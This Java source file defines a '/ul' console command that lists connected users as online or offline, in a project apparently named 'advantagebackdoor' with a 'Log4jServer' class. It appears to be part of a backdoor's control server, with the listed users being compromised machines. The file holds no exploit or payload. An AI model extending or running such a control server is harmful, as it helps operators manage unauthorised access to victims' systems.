package me.faintcloudy.advantagebackdoor.server.command;

import me.faintcloudy.advantagebackdoor.server.Log4jServer;
import me.faintcloudy.advantagebackdoor.api.connection.UserConnection;

import java.util.ArrayList;
import java.util.List;
import java.util.Set;

public class UserListCommand extends ServerCommand {
    public UserListCommand() {
        super("/ul", "查看用户列表");
    }

    @Override
    public void execute(String[] args) {
        Log4jServer.getInstance().getLogger().info("用户列表: ");
        Set<UserConnection> users = Log4jServer.getInstance().getUsers();
        if (users.isEmpty())
        {
            Log4jServer.getInstance().getLogger().info("空!");
            return;
        }
        List<UserConnection> online = new ArrayList<>();
        List<UserConnection> offline = new ArrayList<>();
        for (UserConnection user : Log4jServer.getInstance().getUsers()) {
            if (user.isOnline())
                online.add(user);
            else
                offline.add(user);
        }

        for (UserConnection u : online) {
            Log4jServer.getInstance().getLogger().info(u + " - 在线");
        }
        for (UserConnection u : offline) {
            Log4jServer.getInstance().getLogger().info(u + " - 离线");
        }
    }
}
